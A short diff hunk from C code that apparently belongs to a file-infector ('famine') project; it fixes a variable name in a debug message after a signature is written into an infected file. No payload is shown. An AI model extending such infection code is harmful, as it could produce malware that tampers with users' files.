@@ -64,7 +64,7 @@ void famine_injection(FamineFile *f, void *input, int woody_init_ok) {
     if (write(fd, SIGNATURE, SIGNATURE_LEN) < 0) {
         ERR("Failed to write signature to file: %s\n", f->name);
     } else {
-        DBG("Signature injected successfully to: %s.\n", elf->name);
+        DBG("Signature injected successfully to: %s.\n", f->name);
     }
     close(fd);
 }
